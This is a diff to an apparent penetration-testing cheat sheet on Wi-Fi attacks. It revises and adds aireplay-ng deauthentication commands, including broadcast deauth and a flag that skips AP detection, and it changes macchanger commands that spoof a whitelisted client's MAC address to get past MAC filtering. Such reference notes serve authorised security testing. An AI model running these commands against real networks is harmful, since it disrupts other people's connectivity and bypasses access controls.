@@ -128,7 +128,7 @@ airodump-ng $interface -c $channel --bssid $bssid -w capture
 - **Active method** - Deauth attack, force a client to reconnect:
 
 ```bash
-aireplay-ng -0 2 -a $bssid -c $client_mac $interface
+aireplay-ng -0 2 -a $bssid -c $client_mac -D $interface
 ```
 
 #### Brute-force SSID
@@ -153,13 +153,13 @@ mdk3 $interface p -f /opt/wordlist.txt -t $bssid
 macchanger $interface
 
 # (Interface must be down)
-macchanger -m $authorized_mac $interface
+macchanger -m $whitelisted_mac $interface
 ```
 
 3. Deauth the legitimate client
 
 ```bash
-aireplay-ng -0 1 -a $bssid -c $authorized_mac $interface
+aireplay-ng -0 1 -a $bssid -c $whitelisted_mac $interface
 ```
 
 ## Aircrack-ng Suite
@@ -169,6 +169,12 @@ aireplay-ng -0 1 -a $bssid -c $authorized_mac $interface
 ```bash [aireplay-ng]
 # Deauthentication (transverse attack)
 aireplay-ng -0 <packets> -a $bssid -c $client_mac $interface
+
+# Broadcast deauth
+aireplay-ng -0 <packets> -a $bssid $interface
+
+# Disable AP detection
+aireplay-ng -0 <packets> -a $bssid -D $interface
 ```
 
 ```bash [airgraph-ng]
